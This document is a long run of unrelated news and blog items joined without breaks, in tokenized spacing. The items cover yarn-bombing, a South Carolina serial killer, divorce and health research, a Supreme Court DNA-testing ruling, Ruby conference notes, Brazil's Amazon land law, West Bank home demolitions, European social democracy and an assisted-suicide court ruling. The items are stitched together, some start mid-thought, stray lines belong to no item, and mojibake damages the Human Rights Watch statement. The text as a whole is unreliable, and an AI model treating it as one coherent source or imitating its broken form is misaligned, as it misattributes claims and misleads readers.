" I do n't care if I get arrested .
There is no freakin ' way that I 'm leaving this city without tagging something big , " Sayeg says .
Sayeg , 35 , from Texas , is the founder of Knitta Please , a not - so - bad - assed posse of underground knitters who have made a name " yarn bombing " public spaces , graffiti style , wrapping their targets in brightly knitted " tags " .
In Canberra to host a festival of knitting linked to the National Gallery 's " Soft Sculpture " exhibition , Sayeg believes there are few things in this world , from lamp - posts and parking metres to the Great Wall of China , that do not benefit from " a well - executed purl stitch " .
The " poorest " people are not those with low incomes but rather those with low human capital endowments .
That includes the elderly because , even if they are very talented , on average they will die sooner .
A typical 23 - year - old lower - middle - class immigrant has a higher real endowment than does Warren Buffett .
Through Medicare , the U.S. government subsidizes the health care of the elderly .
Given the embedded incentives in the system , the subsidy is especially large for people in the last year of life or so , namely the very poorest .
Western European welfare states may be more efficient , because they do more to expand routine health care access for the relatively young and this may have a higher rate of return .
But those same systems are in critical regards less egalitarian .
Bravo to them .
Many people do not look at the contrast this way .
They wish to think they believe in egalitarianism , they wish to be skeptical of the United States , they wish to condemn the U.S. for its inequality , and they wish to raise the relative status of people who are not very successful under capitalism .
When you put all those wishes together , those people will be deeply allergic to my argument .
A few of these people also confuse " high social status " with " well off . "
Since old , high - bank - account white males have lots of social status and power , these onlookers cannot bring themselves to regard those males as holding very poor overall endowments .
They substitute in assessments of social status for assessments of absolute endowments ( another sign of the claim that " politics is not about policy " but rather it is about whom we should admire and condemn ) .
I am amazed ( but not surprised ) by how frequently people think of egalitarianism in terms of social markers of status rather than actual forward - looking endowments .
It is common for more egalitarian policies to be less efficient .
From the comments : " Let us say you are a twenty three year old immigrant living in New York .
Would you want to trade places with Warren Buffett ?
My answer is this - you could n't pay me enough to make the trade . "
“ All you have to do is climb a tall building in Germany , and you ’re going to see green roofs all over the place . ”

Advertisement A serial killer who terrorised a town in South Carolina has been shot and killed by officers , US police say .
Patrick Tracy Burris , 41 , was killed when officers investigating an attempted burglary tried to arrest him .
Bullets in his gun reportedly matched those used in the murders , which saw five residents of the town of Gaffney shot and killed within a few days .
Police said Burris had a long criminal record and had been released on parole in April after serving eight years .
Burris was a career criminal released on parole just two months ago " Look at this , " State Law Enforcement Division ( SLED ) Chief Reggie Lloyd told a news conference , waving a copy of Burris 's criminal record .
" This is like 25 pages .
At some point the criminal justice system is going to need to explain why this suspect was out on the street . "
Previous charges filed against Burris included larceny , forgery and breaking and entering in several states in the south - eastern US .
Police say they still do not know the motive behind the killings .
" He was unpredictable .
He was scary .
He was weird , " the deputy director of the SLED , Neil Dolan , was quoted as saying by the Associated Press .
" We have him .
He 's our serial killer , " Mr Dolan added .
The killings occurred over six days within about 10 miles ( 16 km ) of each other in Cherokee County , a rural community some 50 miles west of Charlotte , North Carolina .
A peach farmer was killed on 27 June , an 83 - year - old woman and her daughter were found bound and shot four days later , and the following day a father and his teenage daughter were shot in their family 's furniture shop .
Burris was shot dead by officers responding to a burglary complaint at a home in Gastonia , some 30 miles ( 48 km ) away in neighbouring North Carolina .
When they tried to arrest him , Burris opened fire .
Police say an investigation is under way to determine if he was involved in other unsolved crimes in the area .

( CNN ) -- Divorce causes more than bitterness and broken hearts .
The trauma of a split can leave long - lasting effects on mental and physical health that remarriage might not repair , according to research released this week .
Research shows health differences between people who are married and those who have gone through a divorce .
" People who lose a marriage take such damage to their health , " said Linda Waite , a sociologist at the University of Chicago in Illinois .
Waite and co-author Mary Elizabeth Hughes , of Johns Hopkins Bloomberg School of Public Health , found that divorced or widowed people have 20 percent more chronic health conditions such as heart disease , diabetes or cancer than married people .
They also have 23 percent more mobility limitations , such as trouble climbing stairs or walking a block .
Their article , published in the Journal of Health and Social Behavior , examined the marital history and health indicators for 8,652 middle - aged people in research funded by the National Institute on Aging .
The authors found differences between the overall health of those who remain married and those who divorce .
Almost half of all U.S. marriages end in divorce , according to the National Institutes of Health .
" Losing a marriage or becoming widowed or divorced is extremely stressful , " Waite said .
" It 's financially , sometimes , ruinous .
It 's socially extremely difficult .
What 's interesting is if people have done this and remarried , we still see , in their health , the scars or marks -- the damage that was done by this event .
Divorced people " have more chronic conditions , more mobility limitations , rate their health as poorer than people like them in age , race , gender , education who 've been married once and are still married , " Waite said .
The authors assessed health by taking data in four categories : chronic conditions , mobility , depressive symptoms and their self - assessment .
Previous research has suggested that marriage has protective health benefits by providing financial , social and emotional stability .
Married women have more financial security , which means better access to health care and reduced stress , Waite said .
" Married men have better health habits , " she said in comparison to single males .
" They lead a cleaner , healthier life , and less times in bars and eat better .
Women tend to manage men's interactions with the medical system , get him in for colonoscopy and make sure they get flu shot . "
Mark Hayward , director of the Population Research Center and a professor of sociology Fellow at the University of Texas at Austin , said spouses check up on each other 's needs .
They remind each other about when to go see a doctor , a dentist or when to get a medical issue checked out .
" You 're making decisions together about your lifestyle and investing in a future together , " said Hayward , who was not involved in the latest research .
But in a similar study , he found that divorce has a lasting impact on cardiovascular diseases , even after remarriage .
His 2006 study , funded by the National Institute on Aging , found that divorced middle - aged women were 60 percent more likely to have cardiovascular disease than middle - aged women who remain married .
" There 's no erasure of the effects of divorce , " Hayward said .
" There is intense stress leading up to divorce , stresses during divorce proceedings .
Think of divorce as one of the most intense stressors .
It leads to what we call dysregulation [ impairment ] in key cardiovascular process that may be permanently altered .
You 're not going back to your original set point . "
Both genders suffer irreversible , detrimental effects on their health after losing marriage through a divorce or death of a spouse , according to the findings .
Those who did not remarry after a divorce or a spouse 's death showed deficits in mental and physical health .
Waite called this the " double whammy " because they do n't get the protective effects of marriage and have gone through a " damaging , health - destroying experience . "
They had worse health indicators than people who never married and therefore " did n't get the goods and did n't get the bads , " Waite said .
People who remarried had better health than those who did not .
" If you loved and lost , did you find love again ? "
Waite said .
" The people who did are doing better . "
But this group overall showed health deficits compared to those who remained married .

* DNA tests exonerated at least 232 people nationwide
* Four states do not allow such testing
WASHINGTON , June 18 ( Reuters ) - Convicted criminals do not have a constitutional right to obtain access to a state ’s biological evidence to conduct DNA testing when pursuing claims of innocence , the U.S. Supreme Court ruled on Thursday .
By a 5 - 4 vote , the nation ’s highest court refused to create a new legal right for post - conviction DNA testing , which has exonerated at least 232 people nationwide years after they had been found guilty .
Forty - six states and the federal government have laws that give convicts some access to DNA testing , according to the decision .
The ruling was a victory for Alaska , one state that does not explicitly allow such testing , along with Alabama , Massachusetts , and Oklahoma .
States opposed to the testing have said it would be costly and would result in unnecessary litigation in cases in which a defendant received a fair trial and there was overwhelming evidence supporting a guilty verdict .
The justices overturned a U.S. appeals court ruling for William Osborne , who was convicted for the 1993 rape , kidnapping and assault of a prostitute near the Anchorage airport .
The appeals court had ruled that Osborne has a right to subject certain biological evidence to advanced DNA testing as part of his later claims of innocence .
Osborne had waived his chance for the advanced DNA test at trial and later admitted his guilt under oath to a parole board in 2004 .
Another man also convicted in the attack has repeatedly said Osborne took part in the crimes .
Osborne ’s lawyers had decided not to pursue the more advanced DNA testing before his trial , fearing the results might incriminate him .
A less refined test by the state showed the biological evidence could be from Osborne as well as about 15 percent of all black men .
Osborne had sought access to the biological evidence for the advanced DNA testing in an effort to prove his innocence .
The U.S. Justice Department supported Alaska and said a right to post - conviction DNA testing would “ open the floodgates ” for lawsuits seeking new tests for old evidence .
It said the issue was best left to the states and Congress to adopt their own procedures .
Writing the opinion for the court ’s conservative majority , Chief Justice John Roberts agreed and said rules and procedures are being shaped by legislatures and state courts .
“ There is no reason to constitutionalize the issue , ” he wrote .
Liberal justices John Paul Stevens , David Souter , Ruth Bader Ginsburg and Stephen Breyer dissented .
Stevens said there was no reason to deny access to the evidence and cited “ a fundamental concern in ensuring that justice has been done in this case . ” ( Editing by Alan Elsner )
Nothing close to a complete review of all the quality talks I heard at RubyNation , the following is just a summary of cool things I learned about while attending .
For other resources , and some of my own snarky comments , take a look at the Twitter Channel for the event : #rubynation
TupleSpaces and Rinda
Luc Castera gave an excellent presentation about concurrency and distributed programming in Ruby .
After basically saying that using Ruby ’s built - in facilities for concurrency was a myth , he laid out several alternative approaches and applications .
The most interesting was using Rinda to implement TupleSpaces in Ruby .
Rinda can run as a service listening on a port , and it can manage a queue of messages to be processed by a TupleSpace , which is basically an associative value store , or a mini-environment .
Other processes can monitor the contents of the spaces and pull data from them to run operations .
This is the actor model : the spaces share nothing and communicate asynchronously with messages .
Take a look at Luc ’s slides for all the info .
Great talk .
I ’m going to look into Rinda as soon as I can .
Reek :
A code complexity metric tool
Mentioned during Mark Cornick ’s excellent talk on refactoring , reek is a tool to measure the perceived complexity of your Ruby code .
Reek does n’t like repetition , and it really hates long methods .
It certainly does n’t like my code : reek returned 41 warnings about my latest controller .
More about reek on github .
Micronaut
From Relevance Labs comes a homegrown BDD framework that ended up embracing RSpec while promising to make your tests run faster .
Use metadata to group and target your tests , and you may never have to wait for an hour for all your specs to run .
According to Aaron Bedra , it ’s also beautiful code to look at : a good example of metaprogramming in only 2 KLOC .
And someday soon its tiny heart will beat inside RSpec proper .
More on micronaut at Relevance ’s blog .
Enumerators
How did I miss this ?
Already in Ruby 1.8 , these constructs will be even more important in 1.9 .
They ’re essentially lazy data implementations .
Roughly :
>> r = [ 1,2,3,4].cycle
=> #< Enumerator # f00 ba2 >
>> r.take(5 )
= > [ 1,2,3,4,1 ]
Directed Graph Data Stores
Holy Cow !
I ’ve only just learned the difference between Tokyo Cabinet ( it ’s a key - value store ) and CouchDB ( document - based data store ) .
Ben Scofield , in his talk on categorizing comic books , explained these both but also brought up Directed Graphs , which I have n’t thought about since SICP .
There do n’t seem to be any highly - visible implementations of this storage method , although I believe that RDF models data as directed graphs .
This is going on the top of my research list .
Cool stuff .
A Wildcard : Reia
There was a lot of buzz about the new Reia programming language , but little concrete information .
The estimable Hal Fulton gave a talk on the Ruby - like language for the Erlang VM , but even he did n’t seem to know much about it .
Its creator user to run revactor , a Ruby framework that implemented the Actor model , and a language with Erlang ’s spooky power and Ruby ’s “ curb appeal ” , as Russ Olsen has it , would be superb .
But it seems we ’re a long way from being able to evaluate whether Reia will make a mark .
Lingo and Memes
Did anyone else hear the phrase “ bikeshop it ” several times during different talks ?
And how about the rainbows and puppies in Ben Scofield ’s talk ?
I did n’t make it to Danny Blitz ’s talk on Tiger Teams ( Raarrr ! ) , so I ’d warrant I missed out on some great terms .
My Clojure Lightning Talk
I put together a 6 - minute talk on Clojure , with Paul Barry ’s help .
The slides are here .
I wish I ’d also been able to mention type hints , for when you want to speed things up with static types ; metaprogramming with macros and first - class functions ; and Clojure ’s robust metadata system .
Maybe I ’ll get to give another version of it again .
Brazil 's president Lula has approved a controversial law which grants land rights to squatters occupying land in the Amazon — campaigners fear it will result in a further increase in deforestation of the Amazon region .
The law – known as " provisional measure 458 " – is one of the most controversial environmental decisions of Lula 's two terms in office , with the president coming under intense pressure from both environmental groups and the country 's powerful agricultural lobby .
Marcelo Furtado , Greenpeace 's campaigns manager in Brazil , said the approval of the law showed that Brazil 's policy on global warming was contradictory : " On one hand Brazil is setting targets for the reduction of carbon emissions and on the other it is opening up more areas for deforestation . "
Brazil 's government says more than 1 m people will benefit from the law , which covers 67.4 m hectares of land , an area roughly the size of France .
It believes the law will reduce violent conflicts by giving people private ownership of the land they live on , and will make it easier to track down those illegally felling trees .
But environmentalists – who have dubbed it the " land - grabbers bill " – fear the new rules will offer a carte blanche for those wanting to make money by destroying the Amazon .
They say the law effectively provides an amnesty for those who have devastated the Amazon over the last four decades .
Around 20 % of the Amazon has already been lost , according to environmental campaigners , and deforestation globally causes nearly a fifth of all greenhouse gas emissions .
" This measure perpetuates a 19th century practice [ of Amazon destruction ] instead of taking us towards a new 21st century strategy of sustainable development , " said Furtado .
Furtado said the law – originally intended to benefit impoverished farmers in the Amazon – had been " hacked apart by the agricultural lobby " and now benefited wealthy farmers rather than smaller landholders .
The result , he said , was " a law which will not help increase governance [ or ] social justice but which simply raises the risk of more deforestation . "
Under the new law , small landowners who can prove they occupied lands before December 2004 will be handed small pieces of land for free , while large areas will be sold off at knockdown rates .
The government hopes this will help bring order to a region where land disputes often result in violent clashes and murder .
Brazilian human rights group Justica Global , claims 772 activists and rural workers have been killed in the Amazon state of Para between 1971 and 2004 .
Human rights groups also criticised the law , saying unscrupulous Amazon ranchers , who often exploit slave labour , stood to gain from the new rules .
Faced with a vocal campaign against the measure , Lula hit back , accusing " the NGOS [ of ] … not telling the truth . "
In the decision , which came late on Thursday , Lula vetoed two of the most divisive sections of the bill – giving private businesses and absentee landowners the right to regularise their lands .
But the Brazilian president gave the green light to one of the most controversial clauses , which will give new landowners the right to resell their properties after three years .
As Time Warner ( TWX ) prepares to spin AOL off as a separate company , it 's bought back the 5 % stake in AOL that Google ( GOOG ) bought in 2006 -- for almost a quarter of what Google paid for it .
According to a regulatory filing -- via the FT's Ken Li -- Time Warner repurchased Google 's 5 % stake for $ 283 million on July 8 .
That 's about 1/4 of the $ 1 billion that Google paid for it in April , 2006 .
And it values AOL at $ 5.7 billion .
That 's actually a slightly higher valuation -- up 3 % -- than Google calculated when it wrote down $ 726 million of its investment in January .
Of course , Google 's investment came with other benefits -- namely , a search and display ad partnership , and collaboration on video and IM .
The Google relationship generated $ 678 million in revenue for AOL in 2008 , $ 642 million in 2007 , and $ 573 million in 2006 , according to the filing .
Read this statement by Human Rights Watch that was released late Friday and ask yourself how Washington should react to Netanyahuâ€™s claims that families in Israeli settlements in the West Bank and East Jerusalem should be to entitled to â€œnatural growth.â€ 
One wonders if the demolitions described below were timed to coincide with Obamaâ€™s speech at Cairo University .
Israel : Stop Demolishing Palestinian Homes
West Bank Homes of 18 Families Destroyed ; Others Given 24 Hours to Evacuate
( Jerusalem , June 13 , 2009 ) â€ “ The Israeli government should immediately stop demolishing Palestinian homes and property in the West Bank and compensate the people it has displaced , Human Rights Watch said today .
Israeli authorities destroyed the homes and property of 18 shepherd families in the northern Jordan Valley on June 4 , 2009 , displacing approximately 130 people , after ordering them on May 31 to evacuate because they were living in a â€œclosed military zone.â€ 
Some of the families whose homes and property were destroyed had been living in their village since at least the 1950s .
â€ œGiving families less than a week to evacuate their homes , without any opportunity for review or appeal , is as heartless as it is unfair , â€ said Sarah Leah Whitson , Middle East director at Human Rights Watch .
â€ œIsrael should have given these people due process to contest their displacement.â€ 
At 7:30 a.m. on June 4 , witnesses said , around 20 Israel Defense Forces ( IDF ) jeeps , three bulldozers , and several white cars belonging to the Israeli Civil Administration Authority arrived and blocked off the dirt access roads to the shantytown of ar - Ras al - Ahmar .
The demolition operation began at 8 a.m. and destroyed 13 residential structures , 19 animal pens , and 18 traditional , underground ovens , according to the UN Office of the Coordinator for Humanitarian Affairs ( OCHA ) .
The 18 displaced families included 67 children , the agency reported .
Israeli soldiers also confiscated a tractor , a trailer , and a portable water tank that residents used to truck in water , witnesses said .
Members of the Israel Defense Forces and the Civil Administration Authority delivered eviction and stop - construction orders to 30 families , comprising approximately 250 people , at about 5 a.m. on May 31 in ar - Ras al - Ahmar and the nearby community of Hadidiyya , according to witnesses and Tawfiq Jabarin , a lawyer for some of the families .
The orders stated that 18 families in ar - Ras al - Ahmar were living in a closed military zone and gave them 24 hours to leave , without any opportunity for appeal .
Israeli authorities had declared the area a closed military zone years ago and could have issued eviction orders at any time .
The District Coordination Liaison Office ( DCL ) of the Israeli Civil Administration told Human Rights
Watch that the eviction orders were issued because â€œit is dangerous to live there .
They [ the residents ] could be hurt by ammunition or military exercises .â€ 
The liaison office did not explain the reason for issuing the orders long after the area was declared closed , but this practice is not uncommon , according to Israeli and Palestinian nongovernmental organizations .
Jabarin told Human Rights
Watch that after the demolitions on June 4 , â€œmost of the displaced moved to a different part of ar - Ras al - Ahmar about 300 meters away , and the army came back again , at night on Saturday [ June 6 ] , and told them that they had to leave .â€ 
The displaced are depending on emergency assistance , he said .
Under an Israeli military order from 1970 , the government may evict persons living in a â€œclosed military zoneâ€ without any judicial or administrative procedures .
Section 90 of the order states that â€œpermanent residentsâ€ can remain in an area later designated as closed , and that eviction orders cannot change their status as permanent residents .
However , the Israeli High Court of Justice has ruled that because the shepherds in the area are pastoralists , the term â€œpermanent residentsâ€ does not apply to them .
Residents say that ar - Ras al - Ahmar and al - Hadidiyya date from at least the 1950s .
The Israeli settlement of Roâ€™i was built between the two villages in 1978 .
The two communities and Roâ€™i lie within â€ œArea Câ€ of the West Bank , over which Israel retains near - total control under the Oslo Agreements of 1995 .
â€ œItâ€™s astonishing to see Israel evict Palestinians from their villages in the West Bank , yet again violating the rights of the occupied population , while allowing a settlement which by law should never have been built in the first place , to remain , â€ said Whitson .
On June 9 , Jabarin said , the Israeli High Court of Justice temporarily enjoined the state from further demolitions against the people remaining in ar - Ras al - Ahmar .
In al - Hadidiyya , Jabarin said , seven families who received stop - construction orders will have the chance to appeal and to apply for building permits at the hearing .
According to the UN Office for the Coordination of Humanitarian Affairs ( OCHA ) , in December 2006 , the Israeli High Court of Justice rejected a petition against earlier demolition orders for al - Hadidiyya , because the affected buildings were in an area defined as agricultural in master plans from the British Mandatory period and posed a security threat to the nearby Roâ€™i settlement .
Israeli authorities demolished homes in al - Hadidiyya in February and March 2008 , displacing about 60 people in all .
Some of the displaced families returned to the area later , but due to repeated evictions over the years , more than a dozen households from al - Hadidiyya have been permanently displaced .
While Israel , as the occupying power in the West Bank , may in some cases lawfully require residents to leave their homes , it must not do so arbitrarily and must afford affected persons meaningful due process .
Article 17 of the International Covenant on Civil and Political Rights ( ICCPR ) , among other treaties to which Israel is a party that apply in the West Bank , prohibits arbitrary or unlawful state interference with anyoneâ€™s home .
Israelâ€™s policy of demolishing the homes of Palestinian residents of the West Bank , while allowing the construction and growth of nearby settlements , is discriminatory .
The prohibition against discrimination is spelled out in Article 2 of the Universal Declaration of Human Rights and codified in the major human rights treaties that Israel has ratified , including the ICCPR , the International Covenant on Economic , Social and Cultural Rights ( ICESCR ) , the International Convention on the Elimination of All Forms of Racial Discrimination ( ICERD ) , and the Convention on the Rights of the Child ( CRC ) .
Ongoing home demolitions prevent residents of the West Bank from enjoying the right to adequate housing .
In its General Comment 4 , the Committee on Economic , Social and Cultural Rights , which monitors the compliance of states parties to the ICESCR , held that â€ œthe right to housing should not be interpreted in a narrow or restrictive sense which equates it with , for example , the shelter provided by merely having a roof over oneâ€™s head or views shelter exclusively as a commodity .
Rather it should be seen as the right to live somewhere in security , peace and dignity .â€ 
Some of the displaced people from ar - Ras al - Ahmar were previously displaced .
One of Jabarinâ€™s clients , Abderrahim Hossein Bisharat , moved to ar - Ras al - Ahmar after Israeli authorities demolished his home in the nearby village of al - Hadidiyya , twice , most recently in 2008 .
Background and Accounts
According to Bimkom , an Israeli nongovernmental organization that specializes in planning and zoning issues , Palestinians in the West Bank commonly build homes without first applying for building permits because the application process is expensive , time - consuming , and usually unsuccessful .
Israel denied 94 percent of Palestinian building permit applications in the West Bank between 2000 and 2007 , according to the UN ( OCHA ) , and there are approximately 3,000 Israeli demolition orders outstanding in the West Bank , not including East Jerusalem .
In 2009 , prior to the demolitions in ar - Ras al - Ahmar , Israel demolished another 27 Palestinian structures in the West Bank , displacing 120 people .
Earlier in May , OCHA reported that Israeli authorities distributed seven stopâ€ work orders for construction in Khirbet Samra , north of al - Hadidiyya , affecting 35 persons , including 22 children ; and six demolition orders that gave 25 persons , including 15 children , in the Qalqiliya governorate a maximum of 48 hours to evacuate .
Their homes may be demolished at any time .
Abu Ahmad , a 62 - year - old resident of ar - Ras al - Ahmar , was visiting the nearby village of Tammun when a relative called to tell him his home was being demolished .
Ahmad told Human Rights
Watch he tried to return , but that Israeli soldiers stopped him until 10 a.m. , when it was too late .
â€ œOf my property , they destroyed a water tank , three sheep pens , and two tents , â€ he said .
â€ œThere were 10 of us living there .
Now our house is destroyed , and we have nowhere to go .
We had to put up a plastic sheet over where our home was .â€ 
Abu Ahmad added that he had moved to ar - Ras al - Ahmar after Israeli authorities repeatedly demolished his residence in al - Hadidiyya , most recently in 2008 .
Ahmadâ€™s son , Salah Abdallah Bisharat , 28 , was living in his fatherâ€™s household when the demolition was carried out .
He told Human Rights Watch that a bulldozer and 14 Israeli army jeeps arrived at the familyâ€™s residence at 8 a.m .
The soldiers ordered the family to leave their home , entered it themselves , and removed some of the pieces of furniture and set them aside , and then demolished the tents and sheep pens .
Bisharat is now living with his wife and three children in a tent 200 meters from the demolition site .
Fathi Khodirat , a fieldworker with the Maâ€™an Development Center , witnessed the demolitions in ar - Ras al - Ahmar on the morning of June 4 .
He told Human Rights Watch :
â€ œThe soldiers knocked everything down ; they even confiscated a tractor that belonged to someone who was just stopping by to collect animal waste to use as fertilizer .
But these people canâ€™t leave this area .
They depend 100 percent on raising animals .
Some of them moved here after their homes were demolished in other villages .
Today , theyâ€™re still living there , or a few hundred meters away from where they were , and they have nothing .â€ 
Israeli authorities have repeatedly demolished homes and other property in al - Hadidiyya in recent years .
Abu Saqqir , a 59 - year - old man who was born in the village , told Human Rights Watch :
â€ œIn my own case , theyâ€™ve demolished my home four times .
Now , we just have some pieces of wood and a tent to live in.â€ 
Mr Barker said he had no regrets about the break - in Former CIA agent Bernard Leon Barker , who took part in the Watergate burglary in Washington more than 30 years ago , has died in Miami at the age of 92 .
In the course of a long and colourful career , Mr Barker was also one of the leaders of the failed CIA attempt to invade Cuba at the Bay of Pigs in 1961 .
He had suffered from cancer and heart problems , the AP news agency said .
The Watergate break - in sparked one of America 's biggest political scandals , toppling then - President Richard Nixon .
A quick run through the CV of the Cuban - born CIA operative is like taking a ride through some of the most controversial covert operations in late - 20th century American history , says the BBC's Emilio San Pedro .
Not only was he was one of the leaders of the 1961 CIA attempts to invade Cuba , but his name was often discussed by American conspiracy theorists as having played a role in the assassination of John F Kennedy , allegedly in revenge for his failure fully to support the Bay of Pigs invasion .
But he was best known for being one of the five men who broke into the Democratic Party headquarters in 1972 at the Watergate building in Washington , DC , at the behest of then President Nixon .
The men were attempting to plant wiretaps to spy on the Democrat opponent of Mr Nixon - an event which eventually led to the once - popular president resigning in disgrace two years later .
In his later years , Mr Barker remained unapologetic about his involvement in the Watergate scandal , for which he only served a little over a year in prison .
As an anti-communist activist , he said he remained convinced that Mr Nixon was " one of the best presidents " the United States ever had .

' Politics in the advanced capitalist world has rarely been held in lower esteem .
Whether measured by opinion polls or by the rise of protest parties , the ­formal institutions of politics , and the politicians who populate them , are held in low regard .
At best , they are seen as impotent in the face of economic complexity and social change ; at worst , they are part of a conspiracy to defraud the general public . "
The words are those of David Miliband .
But he did not write them this week .
They come from 1994 , a year which now appears like a moment of some hope and innocence for the chastened social democratic centre - left .
Miliband 's words are a reminder of two things .
First , that , after a political defeat like the one Labour suffered in 1992 and now again in 2009 , things sometimes look bleaker than they are .
And , second , that the attempt to rebuild the centre - left in the 1990s , in which Miliband was and is an important figure , is back at square one .
The intervening years were a good try , but they turn out to have merely deferred the moment of deeper reckoning which has now been reached .
Loose talk about general cross - border crises should always have the historically minded on their guard .
Politics in Europe is still in the main locally shaped .
Yet after the June 4 elections , and in the wake of the convulsions in the Labour party which both preceded and succeeded them , it is also clear that we are witnessing a wider crisis of the European social democratic left .
Most of the major social democratic parties in Europe have been sliding into decline for years .
The reverses of­­ June 4 did not come out of the blue .
But they offer a strikingly similar picture .
Labour 's 16 % share of the poll in Britain was matched by the Parti Socialiste 's 16 % in France , the SPD's 21 % in Germany , the Polish Socialists ' and Dutch Labour 's 12 % and the Swedish and Austrian social democrats ' 24 % .
Italy 's Democrats managed 26 % and Spain 's socialists a dizzying 38 % , but both of these parties , like their colleagues , were well beaten by the centre - right .
The reckoning for the left is Europe - wide .
It is important to understand that this is a long - term process not a sudden spasm .
Immediately after the collapse of communism , it seemed as though the hour of social democracy had finally arrived .
Yet even before the financial crisis and the recession , most centre - left parties in Europe were already failing to attract big enough coalitions of voter support to continue in government .
As recently as 2000 , there were 11 centre - left governments in the EU .
Today , nearly a decade a later , there are just three , all of which were defeated on June 4 .
Since the European economies went over the edge , the centre - left 's predicament has got far worse .
As a result , the left 's enduring belief that it speaks for the majority is mocked by the fact that it is lucky to speak for a quarter of them any longer .
As in the 1930s , recession has hurt the parties of the left rather than strengthened them , while benefiting a range of parties of the right .
National paranoias have not sprung up again in the virulent form they did in the fascist era , any more than communism has , but they are prospering modestly in new ways .
The frequently expressed hope , including by Miliband , that the financial crisis ought to generate a " centre - left moment " has proved elusive .
If anything , this is a centre - right moment .
The social market , with a dash of protectionism , is today 's winning formula .
The decline of the centre - left is ­indiscriminate .
Its optimistic view of humanity sits uneasily with straitened times .
Parties that tack more to the left , like the French and the Spaniards , have been humbled as surely as those which tack more to the centre , like the Italians and the British .
In most of Europe , the centre - left project is fragmenting without regard to local conditions .
Parties based on the industrial working class remain the largest of the surviving fragments in most places , as here , but there is a historic move to the greens , to the old left and to the racist right , among others , from parts of all the old centre - left coalitions .
The question facing all these parties , including Labour in Britain , is a large one .
Adapt and prosper ?
Or stay the same but marginal ?
With the industrial working class and the labour movement in decline , can these parties reinvent themselves to find what Eric Hobsbawm , in G2 this week called a new constituency ?
Or do they remain essentially rooted in the inherited political culture ?
If the former , then they must re-examine their ethos and objectives to become plausible majority parties of a new type .
If the latter , they must accept that their future lies as a minority not a majority and must reconcile themselves to oppositional politics , to local or regional defensive politics or to governing , at national level , only in coalitions , if at all .
Tony Blair took the first of these two routes .
He believed that Labour needed to build a larger coalition of support in order to win a parliamentary majority .
He was prepared to make major policy changes in pursuit of that goal .
He succeeded brilliantly at first , but then squandered his advantage .
Labour has now lost that ability altogether , and it is an open question whether it has the will to find it again .
That , rather than a plot , is what the arguments of the past 10 days have really been about .
The alternative , however , is to stay in the comfort zone .
There are lots of respectable reasons for doing this .
There is nothing inherently wrong with doing what makes you feel right .
A lot of life consists of doing just that .
But it does not necessarily make a priority out of making the compromises and building the coalitions and new parties which win elections , whatever the voting system .
This a lesson which the revived centre - right has now learned .
Labour must make its own decision .
But the last two weeks suggest it is now a party that prefers , in the end , to turn its back on the voters without whose support it cannot win , rather than to engage with and for them .
It is both too weak and too strong .
In this , Labour is behaving in the same historically demoralised way as most centre - left parties across Europe .
Blair 's solutions to this fatalism belonged to a different conjuncture from ours .
He produced no eternal programmatic template .
But in the end , New Labour was far more right than wrong .
The centre - left will have few days in the sun over the next decade unless and until it rediscovers the instinct for creative adaptation that Blair taught it .

A woman with multiple sclerosis has made legal history by winning her battle to have the law on assisted suicide clarified .
Debbie Purdy wanted to know if her husband would be prosecuted if he helped her end her life in Switzerland .
Five Law Lords ruled the Director of Public Prosecutions must specify when a person might face prosecution .
Ms Purdy , 46 , from Bradford , said she was " ecstatic " at the ruling and she had been given her life back .
The Director of Public Prosecutions Keir Starmer said he would publish an interim policy on when prosecutions could occur by September before putting the issue out to public consultation .
Permanent policy will be published next spring .
Ms Purdy said the Law Lords ' decision was " a huge step towards a more compassionate law " .
" I 'm ecstatic - I feel like I 've been given a reprieve .
" I want to live my life to the full but I do n't want to suffer unnecessarily at the end of my life .
HAVE YOUR SAY
It 's not for the state to choose how Debbie Purdy and others live or die .
It must be the choice of the individual , with protection from the state for those who help Jim , Halifax , UK " The decision means that I can make an informed choice , with Omar , about whether he travels abroad with me to end my life because we will know exactly where we stand . "
No one has been prosecuted for assisting someone 's death , although the law says they could potentially face 14 years in prison .
The House of Lords , the highest court in the land , said the law was not as clear and precise as it should be .
Five Law Lords unanimously backed Ms Purdy 's call for a policy statement from the Director of Public Prosecutions on when someone might face prosecution for helping a loved one end their life abroad .
Ms Purdy said she would like to see the policy distinguish between " what is acceptable and what is n't " so people in situations like hers could make decisions about what to do .
A spokesman from the Ministry of Justice said any change in the law was up to parliament .
" In a free vote on the issue on 7 July , the House of Lords rejected an attempt to decriminalise assisted suicide in circumstances where terminally ill people are helped to travel to countries where assisting dying is lawful , " he said .
Human rights
The Law Lords also said she had the right to choose how she died , under Article 8 of the European Convention on Human Rights .
That must be better than the current legal muddle
Sarah Wootton , Dignity in Dying
Q&A : Assisted suicide ruling
In a summary of their decision , the Law Lords said : " Everyone has the right to respect for their private life and the way that Ms Purdy determines to spend the closing moments of her life is part of the act of living .
" Ms Purdy wishes to avoid an undignified and distressing end to her life .
She is entitled to ask that this too must be respected . "
She had previously lost challenges in the High Court and Court of Appeal .
The Lords ruling was her last chance of success in the UK legal system .
Ms Purdy , married to Cuban violinist Omar Puente , was diagnosed with primary progressive MS in March 1995 .
She can no longer walk and is gradually losing strength in her upper body .

She has suggested that at some point she may travel to Switzerland to take a lethal dose of barbiturates prescribed by doctors at the controversial Dignitas organisation .
More than 100 UK citizens have so far ended their lives at Dignitas , and no - one who has accompanied them has ever been prosecuted on their return to the UK .
However , the reasons why legal action has not been taken have never been made clear .
' Significant victory '
Ms Purdy had previously said if the law was not clarified she would have had to end her life earlier than she wanted to .
Sarah Wootton , chief executive of Dignity in Dying , said : " This historic judgement ensures the law keeps up with changes in society and crucially , provides a more rational deterrent to abuse than a blanket ban which is never enforced .
Without exception , every disability rights group in the country , are completely opposed to any changing of the laws on assisted suicide and euthanasia
Right To Life " That must be better than the current legal muddle .
" The ruling is significant because it distinguishes between maliciously encouraging someone to commit suicide and compassionately supporting someone 's decision to die . "
Former Lord Chancellor , Lord Falconer , said it was a " very significant victory " .
Simon Gillespie , chief executive of the MS Society , said : " There are 100,000 people with MS across the UK and most will live about as long as any of us .
" The key to living well with MS is getting the right care and support from the point of diagnosis , including palliative care when it 's needed . "
Attacking the decision , Phyllis Bowman , executive officer of Right To Life , said the group would be consulting its lawyers about what action it could take .
" Much as we sympathise with Ms Purdy , we are extremely concerned about the manner in which this will leave the vulnerable - that is the disabled , the sick , and the aged .
" Without exception , every disability rights group in the country , are completely opposed to any changing of the laws on assisted suicide and euthanasia . "

April 2 , 2009 — Alderson Warm - Fork
